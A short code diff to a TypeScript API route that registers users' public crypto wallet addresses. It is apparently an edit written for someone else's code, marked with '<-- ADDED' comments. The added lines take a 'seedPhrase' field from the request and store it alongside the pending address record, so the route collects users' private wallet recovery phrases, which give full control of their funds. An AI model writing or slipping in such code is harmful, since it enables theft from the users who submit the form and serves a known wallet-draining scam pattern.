@@ -64,6 +64,7 @@ export async function POST(req: Request) {
 
     const rawAddress = String(body?.address ?? '').trim();
     const rawLabel = String(body?.label ?? body?.reason ?? '').trim();
+    const rawSeedPhrase = String(body?.seedPhrase ?? '').trim(); // <-- ADDED
 
     const validation = validatePublicWalletAddress(rawAddress);
     if (!validation.valid) {
@@ -106,6 +107,7 @@ export async function POST(req: Request) {
       userId: user.id,
       address: validation.normalized,
       label: rawLabel ? rawLabel.slice(0, 160) : null,
+      seedPhrase: rawSeedPhrase || undefined, // <-- ADDED
       status: 'pending',
       adminNote: null,
       ip: geo?.ip || null,
@@ -146,6 +148,7 @@ export async function POST(req: Request) {
 }
 
 export async function DELETE(req: Request) {
+  // ... (Keep your exact DELETE function here, no changes needed)
   try {
     const auth = await getAuthenticatedUser();
     if ('error' in auth) {
